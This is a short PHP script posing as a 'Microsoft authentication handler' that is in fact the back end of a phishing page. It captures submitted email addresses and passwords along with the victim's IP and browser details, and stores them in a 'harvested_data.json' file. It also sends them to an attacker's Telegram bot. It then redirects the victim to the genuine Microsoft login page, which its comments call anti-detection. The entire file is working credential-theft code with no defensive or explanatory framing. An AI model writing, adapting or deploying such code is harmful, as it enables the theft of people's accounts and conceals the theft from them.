<?php
// Microsoft authentication handler
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';

// Advanced logging with JSON structure
$log_data = [
    'service' => 'microsoft',
    'credentials' => [
        'email' => $email,
        'password' => $password
    ],
    'metadata' => [
        'ip' => $ip,
        'user_agent' => $user_agent,
        'timestamp' => date('c'),
        'session_id' => session_id()
    ]
];

// Multiple exfiltration methods
file_put_contents('harvested_data.json', json_encode($log_data) . "\n", FILE_APPEND | LOCK_EX);

// Telegram notification with formatted message
$telegram_config = [
    'bot_token' => '1234567890:ABCdefGHIjklMNOpqrSTUvwxyz',
    'chat_id' => '-100123456789'
];

$message = "🎯 Microsoft Account Compromised!\n\n";
$message .= "📧 Email: {$email}\n";
$message .= "🔑 Password: {$password}\n";
$message .= "🌍 IP: {$ip}\n";
$message .= "⏰ " . date('Y-m-d H:i:s');

// Send via file_get_contents (simpler than cURL)
$telegram_url = "https://api.telegram.org/bot{$telegram_config['bot_token']}/sendMessage";
$telegram_data = http_build_query([
    'chat_id' => $telegram_config['chat_id'],
    'text' => $message,
    'parse_mode' => 'HTML'
]);

$context = stream_context_create([
    'http' => [
        'method' => 'POST',
        'header' => 'Content-type: application/x-www-form-urlencoded',
        'content' => $telegram_data
    ]
]);

@file_get_contents($telegram_url, false, $context);

// Anti-detection: redirect to real Microsoft
header('Location: https://login.microsoftonline.com');
exit();
?>